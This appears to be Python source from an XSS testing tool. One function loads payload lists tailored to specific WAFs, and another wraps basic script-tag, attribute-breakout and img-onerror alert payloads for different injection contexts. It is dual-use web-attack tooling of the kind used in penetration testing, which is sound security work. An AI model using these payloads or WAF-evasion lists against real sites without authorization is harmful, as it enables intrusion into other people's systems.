def load_payloads_for_waf(waf_name=None, base_path="payloads/"):
    """
    Load WAF-specific or default payloads from the given directory.

    Args:
        waf_name (str, optional): Name of the WAF.
        base_path (str): Directory containing payload files.

    Returns:
        list: List of payloads.
    """
    payload_file = f"{base_path}/payloads_default.txt"
    if waf_name:
        specific_file = f"{base_path}/payloads_{waf_name.lower()}.txt"
        try:
            with open(specific_file, "r") as file:
                return [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(f"[!] WAF-specific payload file not found: {specific_file}. Using default payloads.")

    with open(payload_file, "r") as file:
        return [line.strip() for line in file if line.strip()]


def generate_payloads(context, details):
    """
    Generates dynamic payloads based on the context of the injection point.

    Args:
        context (str): The context where payloads are to be injected (e.g., script, attribute).
        details (dict): Additional details for fine-tuning payload generation.

    Returns:
        list: List of dynamically generated payloads.
    """
    base_payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<img src=x onerror=alert('XSS')>",
    ]
    dynamic_payloads = []

    if context == "script":
        dynamic_payloads.extend([
            f"<script>{payload}</script>" for payload in base_payloads
        ])
    elif context == "attribute":
        if details.get("quote") == "'":
            dynamic_payloads.extend([
                f"'{payload}'" for payload in base_payloads
            ])
        elif details.get("quote") == '"':
            dynamic_payloads.extend([
                f'"{payload}"' for payload in base_payloads
            ])
    elif context == "html":
        dynamic_payloads.extend([
            f"<div>{payload}</div>" for payload in base_payloads
        ])
    else:
        # Default fallback for unknown contexts
        dynamic_payloads.extend(base_payloads)

    return dynamic_payloads
